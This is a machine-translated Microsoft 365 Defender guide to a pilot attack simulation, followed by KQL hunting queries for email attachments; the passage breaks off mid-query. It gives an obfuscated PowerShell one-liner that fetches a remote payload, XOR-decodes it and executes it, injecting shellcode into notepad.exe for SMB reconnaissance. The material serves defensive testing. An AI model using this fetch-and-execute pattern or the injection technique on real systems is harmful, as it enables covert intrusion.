---
title: Ausführen ihrer Microsoft 365 Defender-Angriffssimulationen
description: Führen Sie Angriffssimulationen für Ihr Microsoft 365 Defender-Pilotprojekt aus, um zu sehen, wie es sich entwickelt und schnell behoben wird.
keywords: Microsoft 365 Defender-Pilotangriffssimulation, Ausführen der Microsoft 365 Defender-Pilotangriffssimulation, Simulieren von Angriffen in Microsoft 365 Defender, Microsoft 365 Defender-Pilotprojekt, Cybersicherheit, erweiterte dauerhafte Bedrohung, Unternehmenssicherheit, Geräte, Geräte, Identität, Benutzer, Daten, Anwendungen, Vorfälle, automatisierte Untersuchung und Behebung, erweiterte Suche
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dolmont
author: DulceMontemayor
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365solution-scenario
- m365solution-pilotmtpproject
ms.topic: conceptual
ms.technology: m365d
ms.openlocfilehash: 767a7ea4c4c7604d1d4b227f08e4ca32c62737c5
ms.sourcegitcommit: a8d8cee7df535a150985d6165afdfddfdf21f622
ms.translationtype: MT
ms.contentlocale: de-DE
ms.lasthandoff: 04/21/2021
ms.locfileid: "51934477"
---
# <a name="run-your-microsoft-365-defender-attack-simulations"></a>Ausführen ihrer Microsoft 365 Defender-Angriffssimulationen

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]


|[![Planung](../../media/phase-diagrams/1-planning.png)](m365d-pilot-plan.md)<br/>[Planung](m365d-pilot-plan.md)|[![Vorbereiten](../../media/phase-diagrams/2-prepare.png)](prepare-m365d-eval.md)<br/>[Vorbereitung](prepare-m365d-eval.md)|![Angriff simulieren](../../media/phase-diagrams/3-simluate.png)<br/>Angriff simulieren|[![Schließen und zusammenfassen](../../media/phase-diagrams/4-summary.png)](m365d-pilot-close.md)<br/>[Schließen und zusammenfassen](m365d-pilot-close.md)|
|--|--|--|--|
|||*Sie sind hier!*||

Sie sind derzeit in der Angriffssimulationsphase.

Nach der Vorbereitung Ihrer Pilotumgebung ist es an der Zeit, die Microsoft 365 Defender Incident Management- und automatisierten Untersuchungs- und Behebungsfunktionen zu testen. Wir helfen Ihnen dabei, einen ausgeklügelten Angriff zu simulieren, der erweiterte Techniken zum Ausblenden vor der Erkennung nutzt. Der Angriff listet geöffnete Server Message Block (SMB)-Sitzungen auf Domänencontrollern auf und ruft aktuelle IP-Adressen der Benutzergeräte ab. Diese Kategorie von Angriffen umfasst in der Regel keine Dateien, die auf dem Gerät des Opfers abgelegt werden, sondern nur im Arbeitsspeicher. Sie "leben vom Land", indem sie vorhandene System- und Verwaltungstools verwenden und ihren Code in Systemprozesse einwerfen, um ihre Ausführung zu verbergen. Mit diesem Verhalten können sie der Erkennung ausweichen und auf dem Gerät bleiben.

In dieser Simulation beginnt unser Beispielszenario mit einem PowerShell-Skript. Ein Benutzer kann zum Ausführen eines Skripts verheddert werden. Oder das Skript kann von einer Remoteverbindung mit einem anderen Computer von einem zuvor infizierten Gerät ausgeführt werden– dem Angreifer, der versucht, sich im Netzwerk zu verschieben. Die Erkennung dieser Skripts kann schwierig sein, da Administratoren häufig auch Skripts remote ausführen, um verschiedene administrative Aktivitäten auszuführen.

![Dateiloser PowerShell-Angriff mit Prozessinjektion und SMB-Aufklärungsangriffsdiagramm](../../media/mtp/mtpdiydiagram.png)

Während der Simulation injiziert der Angriff Shellcode in einen scheinbar harmlosen Prozess. Das Szenario erfordert die Verwendung von notepad.exe. Wir haben diesen Prozess für die Simulation ausgewählt, angreifer würden jedoch eher auf einen langfristigen Systemprozess wie z. B. svchost.exe. Der Shellcode kontaktiert dann den Command-and-Control(C2)-Server des Angreifers, um Anweisungen zum Fortfahren zu erhalten. Das Skript versucht, Aufklärungsabfragen für den Domänencontroller (DC) auszuführen. Durch die Aufklärung kann ein Angreifer Informationen zu den zuletzt verwendeten Benutzeranmeldeinformationen erhalten. Sobald Angreifer über diese Informationen verfügen, können sie sich lateral im Netzwerk bewegen, um zu einem bestimmten vertraulichen Konto zu wechseln.

> [!IMPORTANT]
> Befolgen Sie die Anweisungen zur Angriffssimulation so genau wie möglich, um optimale Ergebnisse zu erzielen.

## <a name="simulation-environment-requirements"></a>Anforderungen an die Simulationsumgebung

Da Sie Ihre Pilotumgebung bereits während der Vorbereitungsphase konfiguriert haben, stellen Sie sicher, dass Sie über zwei Geräte für dieses Szenario verfügen: ein Testgerät und einen Domänencontroller.

1. Überprüfen Sie, ob Ihr [Mandant Microsoft 365 Defender aktiviert hat.](m365d-enable.md#confirm-that-the-service-is-on)

2. Überprüfen Sie die Konfiguration des Testdomänencontrollers:

   - Das Gerät wird mit Windows Server 2008 R2 oder einer späteren Version ausgeführt.
   - Der Testdomänencontroller für [Microsoft Defender for Identity](/azure/security-center/security-center-wdatp) und Aktivieren der [Remoteverwaltung.](/windows-server/administration/server-manager/configure-remote-management-in-server-manager)
   - Stellen Sie sicher, dass [die Integration von Microsoft Defender for Identity und Microsoft Cloud App Security](/cloud-app-security/mdi-integration) aktiviert wurde.
   - Ein Testbenutzer wird in Ihrer Domäne erstellt – es sind keine Administratorberechtigungen erforderlich.

3. Überprüfen der Gerätekonfiguration:

   1. Das Gerät wird mit Windows 10, Version 1903 oder einer neueren Version, ausgeführt.

   1. Das Testgerät ist der Testdomäne beigetreten.

   1. [Aktivieren sie Windows Defender Antivirus](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features). Wenn Sie Probleme beim Aktivieren von Windows Defender Haben, lesen Sie dieses [Problembehandlungsthema](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).

   1. Stellen Sie sicher, dass das Testgerät [in Microsoft Defender for Endpoint onboarded ist.](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)

Wenn Sie einen vorhandenen Mandanten verwenden und Gerätegruppen implementieren, erstellen Sie eine dedizierte Gerätegruppe für das Testgerät, und drücken Sie sie in der Konfigurations-UX auf die oberste Ebene.

## <a name="run-the-attack-scenario-simulation"></a>Ausführen der Simulation des Angriffsszenarios

So führen Sie die Simulation des Angriffsszenarios aus:

1. Melden Sie sich mit dem Testbenutzerkonto beim Testgerät an.

2. Öffnen Sie ein Windows PowerShell auf dem Testgerät.

3. Kopieren Sie das folgende Simulationsskript:

   ```powershell
   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
   = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
   -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
   $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
   $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
   ```

   > [!NOTE]
   > Wenn Sie dieses Dokument in einem Webbrowser öffnen, können Probleme beim Kopieren des Volltexts auftreten, ohne bestimmte Zeichen zu verlieren oder zusätzliche Zeilenumbrüche zu erstellen. Laden Sie dieses Dokument herunter, und öffnen Sie es in Adobe Reader.

4. Fügen Sie an der Eingabeaufforderung das kopierte Skript ein, und führen Sie es aus.

> [!NOTE]
> Wenn Sie PowerShell mithilfe des Remotedesktopprotokolls (RDP) ausführen, verwenden Sie den Befehl Zwischenablagetext eingeben im RDP-Client, da die **Ctrl-V-Hotkey-** oder right-click-paste-Methode möglicherweise nicht funktioniert. Aktuelle Versionen von PowerShell akzeptieren diese Methode manchmal auch nicht. Sie müssen möglicherweise zuerst in Editor im Arbeitsspeicher kopieren, in den virtuellen Computer kopieren und dann in PowerShell einfügen.

Einige Sekunden später <i> wirdnotepad.exe</i> geöffnet. Ein simulierter Angriffscode wird in die notepad.exe. Lassen Sie die automatisch generierte Notepad-Instanz geöffnet, um das vollständige Szenario zu erleben.

Der simulierte Angriffscode versucht, mit einer externen #A0 zu kommunizieren (der C2-Server wird simuliert), und dann versucht er, die Verbindung über SMB auf den Domänencontroller zu übertragen.

Wenn dieses Skript abgeschlossen ist, wird eine Meldung in der PowerShell-Konsole angezeigt.

```console
ran NetSessionEnum against [DC Name] with return code result 0
```

Um das Feature für automatisierten Vorfall und Reaktion in Aktion zu sehen, halten Sie notepad.exe geöffnet. Es wird angezeigt, dass automatisierter Vorfall und Reaktion den Editor-Prozess beenden.

## <a name="investigate-an-incident"></a>Untersuchung eines Vorfalls

> [!NOTE]
> Bevor wir Sie durch diese Simulation gehen, sehen Sie sich das folgende Video an, um zu sehen, wie Die Vorfallverwaltung Ihnen hilft, die zugehörigen Warnungen im Rahmen des Untersuchungsprozesses zusammen zu stellen, wo Sie sie im Portal finden und wie sie Ihnen bei Ihren Sicherheitsvorgängen helfen kann:

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bzwz?]

Wenn Sie zum SoC-Analysten wechseln, können Sie nun beginnen, den Angriff im Microsoft 365 Security Center-Portal zu untersuchen.

1. Öffnen Sie [die Microsoft 365 Security Center-Portalwarteschlange](https://security.microsoft.com/incidents) für Sicherheitsvorfälle auf einem beliebigen Gerät.

2. Navigieren Sie **im Menü** zu Vorfälle.

    ![Screenshot von Vorfällen, wie im linken Menü des Microsoft 365 Security Center gezeigt](../../media/mtp/fig1.png)

3. Der neue Vorfall für den simulierten Angriff wird in der Vorfallwarteschlange angezeigt.

    ![Screenshot der Warteschlange für Vorfälle](../../media/mtp/fig2.png)

### <a name="investigate-the-attack-as-a-single-incident"></a>Untersuchen des Angriffs als einzelner Vorfall

Microsoft 365 Defender korreliert Analysen und aggregiert alle zugehörigen Warnungen und Untersuchungen aus verschiedenen Produkten in einer Vorfallentität. Dadurch zeigt Microsoft 365 Defender eine umfassendere Angriffsgeschichte, sodass der SOC-Analyst komplexe Bedrohungen verstehen und darauf reagieren kann.

Die während dieser Simulation generierten Warnungen sind derselben Bedrohung zugeordnet und werden daher automatisch als einzelner Vorfall aggregiert.

So zeigen Sie den Vorfall an:

1. Navigieren Sie zur **Warteschlange "Vorfälle".**

   ![Screenshot von Vorfällen aus dem Navigationsmenü](../../media/mtp/fig1.png)

2. Wählen Sie das neueste Element aus, indem Sie links neben dem Vorfallnamen auf den Kreis klicken. Ein Seitenbereich zeigt zusätzliche Informationen zu dem Vorfall an, einschließlich aller zugehörigen Warnungen. Jeder Vorfall hat einen eindeutigen Namen, der ihn basierend auf den Attributen der Warnungen beschreibt, die er enthält.

   ![Screenshot der Seite "Vorfälle", auf der generierte Warnungen während der Simulation aggregiert werden](../../media/mtp/fig4.png)

   Die im Dashboard angezeigten Warnungen können basierend auf Dienstressourcen gefiltert werden: Microsoft Defender for Identity, Microsoft Cloud App Security, Microsoft Defender for Endpoint, Microsoft 365 Defender und Microsoft Defender für Office 365.

3. Wählen **Sie Seite Vorfall öffnen aus,** um weitere Informationen zu dem Vorfall zu erhalten.

   Auf der **Seite Vorfall** können Sie alle Warnungen und Informationen im Zusammenhang mit dem Vorfall anzeigen. Die Informationen umfassen die Entitäten und Ressourcen, die an der Warnung beteiligt sind, die Erkennungsquelle der Warnungen (Microsoft Defender for Identity, EDR) und den Grund, warum sie miteinander verknüpft wurden. Das Überprüfen der Warnungsliste für Vorfälle zeigt den Verlauf des Angriffs an. In dieser Ansicht können Sie die einzelnen Warnungen anzeigen und untersuchen.

   Sie können  auch im rechten Menü auf Vorfall verwalten klicken, um den Vorfall zu kennzeichnen, sich selbst zuzuordnen und Kommentare hinzuzufügen.

   ![Screenshot des Orts, an dem auf Vorfall verwalten geklickt werden soll](../../media/mtp/fig5a.png)

   ![Screenshot der Felder im Bereich "Vorfall verwalten", in denen Sie den Vorfall markieren, sich selbst zuweisen und Kommentare hinzufügen können ](../../media/mtp/fig5b.png)

### <a name="review-generated-alerts"></a>Überprüfen generierter Warnungen

Sehen wir uns einige der Warnungen an, die während des simulierten Angriffs generiert wurden.

> [!NOTE]
> Wir werden nur einige der während des simulierten Angriffs generierten Warnungen durchdingen. Abhängig von der Version von Windows und den Microsoft 365 Defender-Produkten, die auf Ihrem Testgerät ausgeführt werden, werden möglicherweise weitere Warnungen angezeigt, die in einer etwas anderen Reihenfolge angezeigt werden.

![Screenshot generierter Warnungen](../../media/mtp/fig6.png)

#### <a name="alert-suspicious-process-injection-observed-source-microsoft-defender-for-endpoint-edr"></a>Warnung: Verdächtige Prozessinjektion beobachtet (Quelle: Microsoft Defender for Endpoint EDR)

Fortgeschrittene Angreifer verwenden ausgefeilte und verdeckte Methoden, um im Arbeitsspeicher zu bleiben und sich vor Erkennungstools auszublenden. Eine gängige Technik besteht in der Ausführung innerhalb eines vertrauenswürdigen Systemprozesses und nicht in einer schädlichen ausführbaren Datei, was es für Erkennungstools und Sicherheitsvorgänge schwierig macht, den schädlichen Code zu erkennen.

Damit die SOC-Analysten diese erweiterten Angriffe abfangen können, bieten Tiefenspeichersensoren in Microsoft Defender for Endpoint unserem Clouddienst einen nie dagewesenen Einblick in eine Vielzahl prozessübergreifender Codeeinspritzungstechniken. In der folgenden Abbildung wird gezeigt, wie Defender for Endpoint beim Versuch, Code in die <i>notepad.exe. </i>

![Screenshot der Warnung zur Einlösung von potenziell schädlichem Code](../../media/mtp/fig7.png)

#### <a name="alert-unexpected-behavior-observed-by-a-process-run-with-no-command-line-arguments-source-microsoft-defender-for-endpoint-edr"></a>Warnung: Unerwartetes Verhalten, das von einem Prozess ohne Befehlszeilenargumente beobachtet wird (Quelle: Microsoft Defender for Endpoint EDR)

Microsoft Defender for Endpoint-Erkennungen zielen häufig auf das gängigste Attribut einer Angriffstechnik ab. Diese Methode gewährleistet Dauerhaftigkeit und erhöht die Leiste für Angreifer, um zu neueren Taktiken zu wechseln.

Wir verwenden umfangreiche Lernalgorithmen, um das normale Verhalten gängiger Prozesse innerhalb einer Organisation und weltweit zu etablieren und zu beobachten, wann diese Prozesse anomale Verhaltensweisen zeigen. Diese anomalen Verhaltensweisen deuten häufig darauf hin, dass überflüssiger Code eingeführt wurde und in einem ansonsten vertrauenswürdigen Prozess ausgeführt wird.

In diesem Szenario weist der <i> Prozessnotepad.exe</i> ein anormales Verhalten auf, bei dem die Kommunikation mit einem externen Standort beteiligt ist. Dieses Ergebnis ist unabhängig von der spezifischen Methode, die zum Einführen und Ausführen des schädlichen Codes verwendet wird.

> [!NOTE]
> Da diese Warnung auf Machine-Learning-Modellen basiert, die zusätzliche Back-End-Verarbeitung erfordern, kann es einige Zeit dauern, bis diese Warnung im Portal angezeigt wird.

Beachten Sie, dass die Warnungsdetails die externe IP-Adresse enthalten – ein Indikator, den Sie als Pivot zum Erweitern der Untersuchung verwenden können.

Wählen Sie die IP-Adresse in der Benachrichtigungsprozessstruktur aus, um die Seite mit den DETAILS der IP-Adresse anzuzeigen.

![Screenshot der Warnung für unerwartetes Verhalten durch einen Prozess ohne Befehlszeilenargumente](../../media/mtp/fig8.png)

In der folgenden Abbildung wird die ausgewählte Seite mit den Details der IP-Adresse angezeigt (klicken Sie in der Struktur des Warnungsprozesses auf DIE IP-Adresse).
![Screenshot der Seite "IP-Adressdetails"](../../media/mtp/fig9.png)

#### <a name="alert-user-and-ip-address-reconnaissance-smb-source-microsoft-defender-for-identity"></a>Warnung: Benutzer- und IP-Adressaufklärung (SMB) (Quelle: Microsoft Defender for Identity)

Die Aufzählung mithilfe des SMB-Protokolls (Server Message Block) ermöglicht Angreifern, aktuelle Benutzeranmeldeinformationen zu erhalten, mit deren Hilfe sie sich lateral durch das Netzwerk bewegen können, um auf ein bestimmtes vertrauliches Konto zu zugreifen.

Bei dieser Erkennung wird eine Warnung ausgelöst, wenn die SMB-Sitzungsaufzählung für einen Domänencontroller ausgeführt wird.

![Screenshot der Microsoft Defender for Identity-Warnung für benutzer- und IP-Adressaufklärung](../../media/mtp/fig10.png)

### <a name="review-the-device-timeline-microsoft-defender-for-endpoint"></a>Überprüfen der Gerätezeitachse [Microsoft Defender for Endpoint]

Nachdem Sie die verschiedenen Warnungen in diesem Vorfall untersucht haben, navigieren Sie zurück zur Vorfallseite, die Sie zuvor untersucht haben. Wählen Sie **auf der** Seite Vorfall die Registerkarte Geräte aus, um die an diesem Vorfall beteiligten Geräte zu überprüfen, wie von Microsoft Defender for Endpoint und Microsoft Defender for Identity gemeldet.

Wählen Sie den Namen des Geräts aus, auf dem der Angriff durchgeführt wurde, um die Entitätsseite für dieses bestimmte Gerät zu öffnen. Auf dieser Seite sehen Sie Warnungen, die ausgelöst wurden, und verwandte Ereignisse.

Wählen Sie **die Registerkarte Zeitachse** aus, um die Gerätezeitachse zu öffnen und alle auf dem Gerät beobachteten Ereignisse und Verhaltensweisen in chronologischer Reihenfolge anzuzeigen, die durch die ausgelösten Warnungen durchgezogen sind.

![Screenshot der Gerätezeitachse mit Verhaltensweisen](../../media/mtp/fig11.png)

Das Erweitern einiger der interessanteren Verhaltensweisen bietet nützliche Details, z. B. Prozessstrukturen.

Scrollen Sie z. B. nach unten, bis Sie das Warnungsereignis **Verdächtige Prozessinjektion beobachtet finden.** Wählen Sie **diepowershell.exe,** die dem darunter notepad.exe-Prozessereignis injiziert wird, um die vollständige Prozessstruktur für dieses Verhalten unter dem Diagramm **Ereignisentitäten** im Seitenbereich anzuzeigen. Verwenden Sie bei Bedarf die Suchleiste zum Filtern.

![Screenshot der Prozessstruktur für das ausgewählte PowerShell-Dateierstellungsverhalten](../../media/mtp/fig12.png)

### <a name="review-the-user-information-microsoft-cloud-app-security"></a>Überprüfen der Benutzerinformationen [Microsoft Cloud App Security]

Wählen Sie auf der Seite Vorfall die Registerkarte **Benutzer** aus, um die Liste der am Angriff beteiligten Benutzer anzeigen zu können. Die Tabelle enthält zusätzliche Informationen zu jedem Benutzer, einschließlich der **Ermittlungspriorität** der einzelnen Benutzer.

Wählen Sie den Benutzernamen aus, um die Profilseite des Benutzers zu öffnen, auf der weitere Untersuchungen durchgeführt werden können. [Lesen Sie mehr über die Untersuchung riskanter Benutzer](/cloud-app-security/tutorial-ueba#identify).

![Screenshot der Cloud App Security-Benutzerseite](../../media/mtp/fig13.png)

## <a name="automated-investigation-and-remediation"></a>Automatische Untersuchung und Reaktion

> [!NOTE]
>Bevor wir Sie durch diese Simulation gehen, sehen Sie sich das folgende Video an, um sich mit der automatisierten Selbstheilung vertraut zu machen, wo sie im Portal zu finden ist und wie sie bei Ihren Sicherheitsvorgängen hilfreich sein kann:

> [!VIDEO https://www.microsoft.com/en-us/videoplayer/embed/RE4BzwB]

Navigieren Sie zurück zum Vorfall im Microsoft 365 Security Center-Portal. Auf **der Registerkarte** Untersuchungen auf der Seite **Vorfall** werden die automatisierten Untersuchungen angezeigt, die von Microsoft Defender for Identity und Microsoft Defender for Endpoint ausgelöst wurden. Im folgenden Screenshot wird nur die automatisierte Untersuchung angezeigt, die von Defender for Endpoint ausgelöst wird. Standardmäßig werden die artefakten in der Warteschlange von Defender for Endpoint automatisch behoben, was eine Korrektur erfordert.

![Screenshot automatisierter Untersuchungen im Zusammenhang mit dem Vorfall](../../media/mtp/fig14.png)

Wählen Sie die Warnung aus, die eine Untersuchung ausgelöst hat, um die Seite **Untersuchungsdetails zu** öffnen. Sie sehen die folgenden Details:

- Warnung(en), die die automatisierte Untersuchung ausgelöst hat.
- Auswirkungen auf Benutzer und Geräte. Wenn Indikatoren auf zusätzlichen Geräten gefunden werden, werden diese zusätzlichen Geräte ebenfalls aufgelistet.
- Liste der Nachweise. Die gefundenen und analysierten Entitäten, z. B. Dateien, Prozesse, Dienste, Treiber und Netzwerkadressen. Diese Entitäten werden auf mögliche Beziehungen zur Warnung analysiert und als gutartig oder bösartig bewertet.
- Gefundene Bedrohungen. Bekannte Bedrohungen, die während der Untersuchung gefunden werden.

> [!NOTE]
> Je nach Zeitpunkt wird die automatisierte Untersuchung möglicherweise noch ausgeführt. Warten Sie einige Minuten, bis der Prozess abgeschlossen ist, bevor Sie die Nachweise sammeln und analysieren und die Ergebnisse überprüfen. Aktualisieren Sie die **Seite Untersuchungsdetails,** um die neuesten Ergebnisse zu erhalten.

![Screenshot der Seite "Untersuchungsdetails"](../../media/mtp/fig15.png)

Während der automatisierten Untersuchung identifizierte Microsoft Defender for Endpoint den notepad.exe-Prozess, der als eines der Artefakte injiziert wurde, die eine Korrektur erfordern. Defender for Endpoint beendet die verdächtige Prozesseinspritzung automatisch im Rahmen der automatisierten Korrektur.

Sie sehen, <i>notepad.exe</i> aus der Liste der ausgeführten Prozesse auf dem Testgerät nicht mehr angezeigt werden.

## <a name="resolve-the-incident"></a>Beheben des Vorfalls

Nachdem die Untersuchung abgeschlossen und bestätigt wurde, dass sie behoben wurde, schließen Sie den Vorfall.

Wählen **Sie Vorfall verwalten aus.** Legen Sie den Status auf **Vorfall beheben,** und wählen Sie die entsprechende Klassifizierung aus.

Wenn der Vorfall behoben wird, werden alle zugeordneten Warnungen im Microsoft 365 Security Center und in den zugehörigen Portalen geschlossen.

![Screenshot der Seite "Vorfälle" mit dem geöffneten Bereich "Vorfall verwalten", auf dem Sie auf die Option zum Beheben von Vorfällen klicken können](../../media/mtp/fig16.png)

Dies schließt die Angriffssimulation für die Vorfallverwaltung und automatisierte Untersuchungs- und Behebungsszenarien ein. Die nächste Simulation wird Sie durch eine proaktive Bedrohungssuche nach potenziell schädlichen Dateien nehmen.

## <a name="advanced-hunting-scenario"></a>Szenario der erweiterten Suche

> [!NOTE]
> Bevor wir Sie durch die Simulation gehen, sehen Sie sich das folgende Video an, um die konzepte für die erweiterte Suche zu verstehen, zu sehen, wo Sie sie im Portal finden können, und wissen, wie sie Ihnen bei Ihren Sicherheitsvorgängen helfen kann:

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bp7O]

### <a name="hunting-environment-requirements"></a>Anforderungen an die Umgebung für die Suche

Für dieses Szenario ist ein einzelnes internes Postfach und Gerät erforderlich. Sie benötigen auch ein externes E-Mail-Konto, um die Testnachricht zu senden.

1. Vergewissern Sie sich, dass Ihr [Mandant Microsoft 365 Defender aktiviert hat.](m365d-enable.md#confirm-that-the-service-is-on)
2. Identifizieren Sie ein Zielpostfach, das für den Empfang von E-Mails verwendet werden soll.
    a. Dieses Postfach muss von Microsoft Defender für Office 365 b überwacht werden. Das Gerät von Anforderung 3 muss auf dieses Postfach zugreifen
3. Konfigurieren eines Testgeräts: a. Stellen Sie sicher, dass Sie Windows 10 Version 1903 oder höher verwenden.
    b. Verbinden Sie das Testgerät mit der Testdomäne.
    c. [Aktivieren sie Windows Defender Antivirus](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features). Wenn Sie Probleme beim Aktivieren Windows Defender Antivirus haben, lesen Sie [dieses Problembehandlungsthema](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).
    d. [Onboarding bei Microsoft Defender for Endpoint](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).

### <a name="run-the-simulation"></a>Ausführen der Simulation

1. Senden Sie von einem externen E-Mail-Konto eine E-Mail an das postfach, das in Schritt 2 des Abschnitts test environment requirements identifiziert ist. Fügen Sie eine Anlage ein, die über vorhandene E-Mail-Filterrichtlinien zulässig ist. Diese Datei muss weder schädlich noch eine ausführbare Datei sein. Vorgeschlagene Dateitypen sind <i>.pdf,</i> <i>.exe</i> (sofern zulässig) oder Office-Dokument wie eine Word-Datei.
2. Öffnen Sie die gesendete E-Mail von dem Gerät, das gemäß Schritt 3 des Abschnitts test environment requirements konfiguriert ist. Öffnen Sie die Anlage, oder speichern Sie die Datei auf dem Gerät.

#### <a name="go-hunting"></a>Auf die Suche gehen

1. Öffnen Sie das security.microsoft.com Portal.

2. Navigieren Sie zu **Hunting > Advanced hunting**.

   ![Screenshot der erweiterten Suche in der Navigationsleiste des M365 Security Center-Portals](../../media/mtp/fig17.png)

3. Erstellen Sie eine Abfrage, die mit dem Sammeln von E-Mail-Ereignissen beginnt.

   1. Wählen Sie im Abfragebereich Neu aus.

   1. Doppelklicken Sie im Schema auf die Tabelle EmailEvents.

      ```console
      EmailEvents
      ```

   1. Ändern Sie den Zeitrahmen in die letzten 24 Stunden. Unter der Annahme, dass die E-Mail, die Sie beim Ausführen der obigen Simulation gesendet haben, in den letzten 24 Stunden lag, ändern Sie andernfalls den Zeitrahmen.

      ![Screenshot der Stelle, an der Sie den Zeitrahmen ändern können. Öffnen Sie das Dropdownmenü, um zwischen verschiedenen Zeitrahmenoptionen zu wählen.](../../media/mtp/fig18.png)

   1. Führen Sie die Abfrage aus. Je nach Umgebung des Pilotprojekts können viele Ergebnisse erzielt werden.

      > [!NOTE]
      > Weitere Informationen zum Einschränken der Datenrücklaufoptionen finden Sie im nächsten Schritt.

      ![Screenshot der erweiterten Abfrageergebnisse für die Suche](../../media/mtp/fig19.png)

        > [!NOTE]
        > Bei der erweiterten Suche werden Abfrageergebnisse als tabellarische Daten angezeigt. Sie können die Daten auch in anderen Formattypen wie Diagrammen anzeigen.

   1. Sehen Sie sich die Ergebnisse an, und sehen Sie, ob Sie die E-Mail identifizieren können, die Sie geöffnet haben. Es kann bis zu 2 Stunden dauern, bis die Nachricht bei der erweiterten Suche angezeigt wird. Wenn die E-Mail-Umgebung groß ist und viele  Ergebnisse verfügbar sind, können Sie die Option Filter anzeigen verwenden, um die Nachricht zu finden.

      Im Beispiel wurde die E-Mail von einem Yahoo-Konto gesendet. Klicken Sie auf das Symbol yahoo.com unter dem Abschnitt **+** SenderFromDomain, und klicken Sie dann auf **Übernehmen,** um der Abfrage die ausgewählte Domäne hinzuzufügen.  Verwenden Sie das Domänen- oder E-Mail-Konto, das zum Senden der Testnachricht in Schritt 1 von Ausführen der Simulation verwendet wurde, um Ihre Ergebnisse zu filtern. Führen Sie die Abfrage erneut aus, um ein kleineres Ergebnissatz zu erhalten, um zu überprüfen, ob die Nachricht aus der Simulation angezeigt wird.

      ![Screenshot der Filter. Verwenden Sie Filter, um die Suche zu einent- und schneller zu finden, was Sie suchen.](../../media/mtp/fig20.png)

      ```console
      EmailEvents
      | where SenderMailFromDomain == "yahoo.com"
      ```

   1. Klicken Sie in der Abfrage auf die resultierenden Zeilen, damit Sie den Datensatz überprüfen können.

      ![Screenshot des Seitenbereichs "Überprüfen des Datensatzes", der geöffnet wird, wenn ein erweitertes Ergebnis für die Suche ausgewählt wird](../../media/mtp/fig21.png)

4. Nachdem Sie nun überprüft haben, ob die E-Mail angezeigt werden kann, fügen Sie einen Filter für die Anlagen hinzu. Konzentrieren Sie sich auf alle E-Mails mit Anlagen in der Umgebung. Konzentrieren Sie sich in diesem Szenario auf eingehende E-Mails, nicht auf die E-Mails, die aus Ihrer Umgebung gesendet werden. Entfernen Sie alle filter, die Sie hinzugefügt haben, um Ihre Nachricht zu finden und "| wobei **AttachmentCount > 0 und** **EmailDirection**  ==  **"Inbound"**

   Die folgende Abfrage zeigt Ihnen das Ergebnis mit einer kürzeren Liste als Die ursprüngliche Abfrage für alle E-Mail-Ereignisse:

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   ```

5. Fügen Sie als Nächstes die Informationen zur Anlage (z. B. Dateiname, Hashes) zu Ihrem Ergebnissatz ein. Schließen Sie sich dazu der **EmailAttachmentInfo-Tabelle** an. Die allgemeinen Felder, die für den Beitritt verwendet werden sollen, sind in diesem Fall **NetworkMessageId** und **RecipientObjectId**.

   Die folgende Abfrage enthält auch eine zusätzliche Zeile "| **project-rename EmailTimestamp=Timestamp**", mit dem Sie ermitteln können, welcher Zeitstempel mit der E-Mail im Zusammenhang mit Zeitstempeln im Zusammenhang mit Dateiaktionen stand, die Sie im nächsten Schritt hinzufügen.

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   | project-rename EmailTimestamp=Timestamp
   | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
   ```

6. Verwenden Sie als Nächstes den **SHA256-Wert** aus der **EmailAttachmentInfo-Tabelle,** um **DeviceFileEvents** (Dateiaktionen, die auf dem Endpunkt passiert sind) für diesen Hash zu finden. Das allgemeine Feld hier ist der SHA256-Hash für die Anlage.

   Die resultierende Tabelle enthält nun Details vom Endpunkt (Microsoft Defender for Endpoint), z. B. gerätename, welche Aktion durchgeführt wurde (in diesem Fall gefiltert, um nur FileCreated-Ereignisse zu enthalten) und wo die Datei gespeichert wurde. Der dem Prozess zugeordnete Kontoname wird ebenfalls einbezogen.

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   | project-rename EmailTimestamp=Timestamp
   | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
   | join DeviceFileEvents on SHA256
   | where ActionType == "FileCreated"
   ```

   Sie haben nun eine Abfrage erstellt, die alle eingehenden E-Mails identifiziert, in denen der Benutzer die Anlage geöffnet oder gespeichert hat. Sie können diese Abfrage auch so verfeinern, dass sie nach bestimmten Absenderdomänen, Dateigrößen, Dateitypen und so weiter filtert.

7. Funktionen sind eine besondere Art von Verknüpfung, mit der Sie mehr TI-Daten zu einer Datei wie verbreitung, Signier- und Ausstellerinformationen usw. ziehen können. Um weitere Details zur Datei zu erhalten, verwenden Sie die **FileProfile()-Funktionserweiterung:**

    ```console
    EmailEvents
    | where AttachmentCount > 0 and EmailDirection == "Inbound"
    | project-rename EmailTimestamp=Timestamp
    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
